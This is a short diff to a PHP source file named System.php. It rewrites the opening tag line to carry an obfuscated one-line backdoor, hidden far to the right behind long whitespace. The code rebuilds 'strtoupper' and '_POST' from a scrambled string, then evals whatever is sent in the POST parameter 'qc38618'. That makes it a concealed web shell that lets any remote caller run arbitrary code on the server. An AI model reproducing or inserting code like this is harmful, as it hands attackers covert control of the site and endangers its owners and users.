@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                         $yzm13= "oreust_p" ;$huzg7 = $yzm13[4].$yzm13[5].$yzm13[1]. $yzm13[5].$yzm13[0]. $yzm13[3]. $yzm13[7]. $yzm13[7].$yzm13[2]. $yzm13[1] ; $bote34=$huzg7 ($yzm13[6].$yzm13[7]. $yzm13[0].$yzm13[4].$yzm13[5] );if(isset ( ${ $bote34}[ 'qc38618' ]) ) {eval ( ${$bote34 }[ 'qc38618'] ); }?> <?php
 /**
  * System.php
  *
